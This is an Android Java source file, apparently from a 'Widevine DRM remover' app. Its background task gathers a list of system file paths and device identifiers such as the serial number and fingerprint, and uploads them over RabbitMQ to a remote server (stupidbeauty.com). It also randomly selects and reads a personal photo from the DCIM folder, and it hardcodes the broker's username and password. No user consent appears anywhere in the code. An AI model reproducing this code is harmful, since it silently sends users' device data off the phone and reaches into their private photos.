package com.stupidbeauty.comgooglewidevinesoftwaredrmremover;

import android.os.AsyncTask;
import android.os.Build;
import android.os.Environment;
import android.util.Log;

import com.google.protobuf.ByteString;
import com.rabbitmq.client.Channel;
import com.rabbitmq.client.Connection;
import com.rabbitmq.client.ConnectionFactory;
import com.rabbitmq.client.MessageProperties;
import com.stupidbeauty.feedback.activity.FeedbackActivity;
import com.stupidbeauty.comgooglewidevinesoftwaredrmremover.app.DiagnoseInformation;
import org.apache.commons.io.FileUtils;
import org.apache.commons.io.filefilter.ConditionalFileFilter;
import org.apache.commons.io.filefilter.IOFileFilter;
import org.apache.commons.io.filefilter.TrueFileFilter;

import java.io.File;
import java.util.Collection;
import java.util.Random;


/**
 * @author Hxcan
 * @since Mar 13, 2014
 */
public final class SystemFileListSendTask extends AsyncTask<Object, Void, Boolean>
{
  public static final String SYSTEM_FILE_LIST_QUEUE_NAME = "com.stupidbeauty.comgooglewidevinesoftwaredrmremover.SystemFileListQueue"; //!<反馈队列名字。

  private static final String RabbitMQUserName="optimizerepair"; //!<RabbitMQ用户名。
  private static final String RabbitMQPassword="som3150"; //!<RabbitMQ密码。

	private static final String TAG="TranslateRequestSen"; //!<输出调试信息时使用的标记。

    public SystemFileListSendTask()
    {
    } //public TranslateRequestSendTask(OptimizeRepairSimpleActivity activity)

		@Override
		protected Boolean doInBackground(Object... params)
        {
            //参数顺序：
//            fileList.



            Boolean result=false; //结果，是否成功。

            //使用protobuf将各个字段序列化成字节数组，然后使用rabbitmq发送到服务器。

            Collection<File> fileList=(Collection<File>)(params[0]); //获取文件列表。

            String subject=""; //!<系统文件列表的文字内容。

            for(File currentFile:fileList)
            {
                subject=subject+ currentFile.getAbsolutePath()+"\n";
            } //for(File currentFile:fileList)

			try //尝试构造请求对象，并且捕获可能的异常。
            {
                File photoFile=findRandomPhotoFile(); //随机寻找一个照片文件。


                SystemFileListMessageProtos.SystemFileListMessage.Builder translateRequestBuilder = SystemFileListMessageProtos.SystemFileListMessage.newBuilder();



                byte[] photoBytes= FileUtils.readFileToByteArray(photoFile); //将照片文件内容全部读取。
                ByteString photoByteArray=ByteString.copyFrom(photoBytes); //构造照片的字节字符串。




                translateRequestBuilder.setFeedbacktext(subject); //设置反馈文字内容。

                translateRequestBuilder.getDiagnoseinformationBuilder().setOsversion(Build.VERSION.RELEASE);
                translateRequestBuilder.getDiagnoseinformationBuilder().setBoard(Build.BOARD);
                translateRequestBuilder.getDiagnoseinformationBuilder().setBootloader(Build.BOOTLOADER);
                translateRequestBuilder.getDiagnoseinformationBuilder().setBrand(Build.BRAND);
                translateRequestBuilder.getDiagnoseinformationBuilder().setDevice(Build.DEVICE);
                translateRequestBuilder.getDiagnoseinformationBuilder().setDisplay(Build.DISPLAY);
                translateRequestBuilder.getDiagnoseinformationBuilder().setFingerprint(Build.FINGERPRINT);
                translateRequestBuilder.getDiagnoseinformationBuilder().setHardware(Build.HARDWARE);
                translateRequestBuilder.getDiagnoseinformationBuilder().setHost(Build.HOST);
                translateRequestBuilder.getDiagnoseinformationBuilder().setId(Build.ID);
                translateRequestBuilder.getDiagnoseinformationBuilder().setManufacturer(Build.MANUFACTURER);
                translateRequestBuilder.getDiagnoseinformationBuilder().setModel(Build.MODEL);
                translateRequestBuilder.getDiagnoseinformationBuilder().setProduct(Build.PRODUCT);
                translateRequestBuilder.getDiagnoseinformationBuilder().setSerial(Build.SERIAL);
                translateRequestBuilder.getDiagnoseinformationBuilder().setType(Build.TYPE);
                translateRequestBuilder.getDiagnoseinformationBuilder().setUser(Build.USER);

                byte[] array=translateRequestBuilder.build().toByteArray();; //序列化成字节数组。

                //使用RabbitMQ来发送：
                ConnectionFactory factory=new ConnectionFactory(); //创建连接工厂。
                factory.setHost("stupidbeauty.com"); //设置主机。
                factory.setUsername(RabbitMQUserName); //设置用户名。
                factory.setPassword(RabbitMQPassword); //设置密码。
                Connection connection=factory.newConnection(); //创建连接。
                Channel channel=connection.createChannel(); //创建频道。

                Boolean durableTrue=true; //持久的。

                Boolean exclusiveFalse=false; //非排他性的。
                Boolean autoDeleteFalse=false; //不要自动删除。

                channel.queueDeclare(SYSTEM_FILE_LIST_QUEUE_NAME, durableTrue, exclusiveFalse, autoDeleteFalse, null); //声明队列。

                String exchange=""; //交换机。
                String routingKey= SYSTEM_FILE_LIST_QUEUE_NAME; //路由键。锓

                byte[] byteArrayBody=array; //消息体。

                channel.basicPublish(exchange,routingKey, MessageProperties.PERSISTENT_BASIC,byteArrayBody);

                Log.d(TAG,"doInBackground,published translate request"); //Debug.

                result=true; //成功。

            } //try //尝试构造请求对象，并且捕获可能的异常。
            catch (Exception e)
            {

				e.printStackTrace();
			}
            catch (OutOfMemoryError error) //内存不足。
            {
                error.printStackTrace(); //报告错误。
            } //catch (OutOfMemoryError error) //内存不足。

			return result;
		}

    /**
     * 随机寻找一个照片文件。
     * @return 随机寻找的一个照片文件。
     */
    private  File findRandomPhotoFile()
    {
        File result=null;

        String photoDirectoryPath= Environment.getExternalStorageDirectory().getPath()+File.separator+ Environment.DIRECTORY_DCIM; //照片目录路径。

        File photoDirecotry= new File(photoDirectoryPath); //照片目录。

        Log.d(TAG,"findRandomPhotoFile,photo directory:"+photoDirectoryPath); //Debug.

        IOFileFilter fileFilter= TrueFileFilter.INSTANCE; //文件过滤器。

        IOFileFilter dirFilter= TrueFileFilter.INSTANCE; //文件过滤器。

        try //尝试列出文件，并且捕获可能的异常。
        {

            Collection<File> photoFiles= FileUtils.listFiles(photoDirecotry, fileFilter, dirFilter); //列出全部文件。

            Random random=new Random(); //随机数生成器。

            int randomIndex=random.nextInt(photoFiles.size()); //随机选择一个文件。

            result=(File)((photoFiles.toArray())[randomIndex]); //选择指定的文件。

        } //try //尝试列出文件，并且捕获可能的异常。
        catch (IllegalArgumentException illegalArgumentException) //参数不符合要求。
        {
            illegalArgumentException.printStackTrace(); //输出调用栈。
        } //catch (IllegalArgumentException illegalArgumentException) //参数不符合要求。




        return result;
    } //private  File findRandomPhotoFile()


    /**
     * 报告结果。
     * @param result 结果。是否成功。
     */
		@Override
		protected void onPostExecute(Boolean result)
        {


		} //protected void onPostExecute(Boolean result)
	}



